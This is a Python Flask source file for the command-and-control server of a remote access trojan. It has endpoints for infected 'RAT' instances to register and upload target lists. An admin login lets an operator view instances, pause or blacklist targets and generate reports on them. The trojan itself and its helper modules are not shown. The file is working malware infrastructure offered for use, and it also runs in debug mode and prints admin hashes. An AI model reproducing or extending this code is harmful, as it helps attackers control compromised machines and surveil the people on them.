"""
Main file for the Command and Control server

This file contains endpoints for both the RAT device and the command client. Classes for the RAT start with "RAT" while 
ones for the client start with "Client"
"""
import os
import bcrypt
import secrets
from flask import Flask
from flask import request
from flask import session
from flask import redirect
from flask import make_response
from flask import render_template
from functools import wraps
from flask_restful import Api
from flask_restful import Resource

from dotenv import load_dotenv
load_dotenv()

import rat_api
import database
import client_api

app = Flask(__name__, static_folder="static")
api = Api(app)
app.secret_key = secrets.token_hex(32)
db = database.Database()

# set admin cookie to un-guessable random string until its set
admin_cookie = secrets.token_hex(32)

@app.after_request
def add_header(response):
    response.headers['Cache-Control'] = 'no-store'
    return response

def rat_authentication(f):
    """ Authentication for the remote device """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.cookies.get('client_id')
        if not db.is_document(token):
            return make_response("Unauthorized", 401)
        return f(*args, **kwargs)
    return decorated_function

def admin_auth(f):
    """ Authentication required for admin """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        cookie = request.cookies.get("token")
        if cookie != globals()['admin_cookie']:
            return redirect("/login")
        return f(*args, **kwargs)
    return decorated_function



class RATRegisterClient(Resource):
    @staticmethod
    def post():
        """ Register a new instance of the RAT machine """
        data, status_code = rat_api.register_client(request.get_json())
        response = make_response(data)
        if status_code == 200:
            response.set_cookie("client_id", data['client_id'])
        response.content_type = "Application/json"
        response.status_code = status_code
        return response




class RATTargetList(Resource):
    @staticmethod
    @rat_authentication
    def post():
        """ Update target list, return if any targets got blacklisted """
        data, status_code = rat_api.update_target_list(
                request.cookies.get("client_id"),
                request.get_json()
            )
        response = make_response(data)
        response.content_type = "Application/json"
        response.status_code = status_code
        return response


class HomePage(Resource):
    @staticmethod
    @admin_auth
    def get():
        """ User can decide which instance to view"""
        instances, status_code = client_api.get_instances()
        response = make_response(render_template("index.html", mappings=instances))
        response.status_code = status_code
        return response


class AdminLogin(Resource):
    @staticmethod
    def get():
        """ Get login page """
        response = make_response(render_template("login.html"))
        return response

    @staticmethod
    def post():
        """ Login as admin """
        username = request.form['username'].encode("utf-8")
        password = request.form['password'].encode("utf-8")
        stored_username = bytes.fromhex(os.getenv("ADMIN_USER"))
        stored_password = bytes.fromhex(os.getenv("ADMIN_PW"))

        if bcrypt.checkpw(username, stored_username) and bcrypt.checkpw(password, stored_password):
            globals()['admin_cookie'] = secrets.token_hex(32)
            response = make_response(redirect("/"))
            response.set_cookie("token", globals()['admin_cookie'])
        else:
            response = make_response({"error": "Username or password is incorrect"})
            response.status_code = 401
            response.content_type = "application/json"

        return response



class InstancePage(Resource):
    @staticmethod
    @admin_auth
    def get(instance: str):
        """ Get the page for a specific instance """
        data, status_code = client_api.get_instance_page_data(instance)
        if status_code == 200:
            response = make_response(render_template("instance.html", data=data))
        else:
            response = make_response(data['error'])
        response.status_code = status_code

        return response


class ToggleTargetStoppedState(Resource):
    @staticmethod
    @admin_auth
    def get(instance: str, target: str):
        data, status_code = client_api.toggle_target_blacklist(instance, target)
        response = make_response(data)
        response.content_type = "application/json"
        response.status_code = status_code
        return response


class GenerateReport(Resource):
    @staticmethod
    @admin_auth
    def get(instance: str, target: str):
        data, status_code = client_api.generate_report(instance, target)
        response = make_response(data)
        response.content_type = "application/json"
        response.status_code = status_code
        return response


api.add_resource(HomePage, "/")
api.add_resource(AdminLogin, "/login")
api.add_resource(InstancePage, "/i/<instance>/", "/i/<instance>")
api.add_resource(GenerateReport, "/api/v0/report/<instance>/<target>")
api.add_resource(ToggleTargetStoppedState, "/api/v0/pause/<instance>/<target>")


api.add_resource(RATRegisterClient, "/api/v0/rat/register")
api.add_resource(RATTargetList, "/api/v0/rat/targetlist")

if __name__ == "__main__":

    if os.getenv("ADMIN_USER")  is None or os.getenv("ADMIN_PW") is None:
        admin_user = bcrypt.hashpw(
                input("Admin username: ").encode("utf-8"),
                bcrypt.gensalt()
            ).hex()

        admin_password = bcrypt.hashpw(
                input("Admin password: ").encode("utf-8"),
                bcrypt.gensalt()
            ).hex()

        os.environ['ADMIN_USER'] = admin_user
        print('admin_user: ',admin_user , type(admin_user))
        os.environ['ADMIN_PW'] = admin_password
        print('admin_password: ',admin_password , type(admin_password))

    app.run(host="0.0.0.0", debug=True)

